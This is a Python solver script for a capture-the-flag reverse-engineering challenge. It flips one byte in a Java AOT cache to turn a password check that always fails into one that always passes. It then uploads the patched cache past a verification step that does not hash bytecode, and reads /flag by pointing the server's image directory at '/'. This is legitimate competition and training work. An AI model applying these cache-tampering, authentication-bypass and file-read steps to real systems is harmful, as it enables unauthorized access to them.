#!/usr/bin/env python3
"""
Solver for the `leftover-leftovers` reverse-engineering challenge.

The challenge is a two-stage follow-up to `leftovers`:

  Stage 1: OuterServer (lives entirely in outer-cache.aot — the
           `de/kitctf/gpn24/leftovers2/` package is empty in the JAR)
           accepts a `cache.aot` multipart upload at POST /init,
           runs `verifyStuff()` on it, and if the hash matches the
           original it writes /tmp/cache.aot and exits.

  Stage 2: the leftovers Server runs against the newly-written
           /tmp/cache.aot.

The bundled cache.aot's `Server.lambda$main$15` is reduced to 5 bytes:

    03 b8 11 00 b0    iconst_0; invokestatic Boolean.valueOf; areturn

…so the password validator always returns Boolean.FALSE and the live
server rejects every password with "Password login is currently
disabled". The exploit is a one-byte patch at file offset 0x1F05A88
that flips iconst_0 (0x03) to iconst_1 (0x04). `verifyStuff` doesn't
hash the bytecode bytes, so the patched cache survives the upload
check; Stage 2 then accepts any password and the regular leftovers
exploitation reads /flag.
"""

import json
import shutil
import sys
import urllib.error
import urllib.request

LAMBDA_15_BODY_OFFSET = 0x1F05A88
ORIG_BODY = bytes([0x03, 0xB8, 0x11, 0x00, 0xB0])     # iconst_0; invokestatic; areturn
PATCHED_BODY = bytes([0x04, 0xB8, 0x11, 0x00, 0xB0])  # iconst_1; invokestatic; areturn


def patch_cache(src: str, dst: str) -> None:
    """Copy `src` to `dst`, flipping lambda$main$15's iconst_0 to iconst_1."""
    shutil.copyfile(src, dst)
    with open(dst, "r+b") as f:
        f.seek(LAMBDA_15_BODY_OFFSET)
        before = f.read(len(ORIG_BODY))
        if before != ORIG_BODY:
            raise SystemExit(
                f"unexpected bytes at 0x{LAMBDA_15_BODY_OFFSET:x}: {before.hex()}\n"
                f"(this offset is correct for the challenge's bundled cache.aot)"
            )
        f.seek(LAMBDA_15_BODY_OFFSET)
        f.write(PATCHED_BODY)


def upload(base: str, path: str) -> None:
    """POST the patched cache to Stage 1's /init endpoint.

    The connection will close (TCP RST / empty reply) once Stage 1 has
    written /tmp/cache.aot and exec'd into Stage 2; that's expected.
    """
    boundary = "----leftover-leftovers"
    with open(path, "rb") as f:
        data = f.read()
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="cache.aot"; filename="cache.aot"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
    req = urllib.request.Request(
        f"{base}/init",
        method="POST",
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        data=body,
    )
    try:
        urllib.request.urlopen(req, timeout=180).read()
    except urllib.error.URLError:
        pass  # expected: server closes the connection after the handoff


def exploit(base: str) -> str:
    """Once Stage 2 is up, set folderPath=/, add a Product named flag, and
    read /images/flag."""
    def json_request(path: str, method: str, body: dict) -> tuple[int, str]:
        req = urllib.request.Request(
            f"{base}{path}",
            method=method,
            headers={"Content-Type": "application/json"},
            data=json.dumps(body).encode(),
        )
        try:
            with urllib.request.urlopen(req) as r:
                return r.status, r.read().decode()
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode()

    status, _ = json_request("/set-image-dir", "POST",
                             {"password": "anything", "newPath": "/"})
    if status != 200:
        raise SystemExit(f"unlock failed ({status}); cache patch may not have applied")

    json_request("/products/flag", "PUT", {
        "product": {
            "name": "flag",
            "quantity": 1,
            "bestBefore": "2030-01-01T00:00:00",
            "notAfter": "2030-01-01T00:00:00",
        },
        "imageUrl": "http://example.invalid/x.png",
    })

    with urllib.request.urlopen(f"{base}/images/flag") as r:
        return r.read().decode().strip()


def main() -> None:
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <bundled cache.aot> <instance URL>")
        sys.exit(1)
    src = sys.argv[1]
    base = sys.argv[2].rstrip("/")

    patched = "/tmp/cache_patched.aot"
    patch_cache(src, patched)
    print(f"Patched cache → {patched}  (1 byte at 0x{LAMBDA_15_BODY_OFFSET:X}: 03 → 04)")

    print(f"Uploading to {base}/init … (this takes ~90s; Stage 1 closes the "
          f"connection after the handoff)")
    upload(base, patched)

    print("Exploiting Stage 2 …")
    flag = exploit(base)
    print(f"Flag: {flag}")


if __name__ == "__main__":
    main()
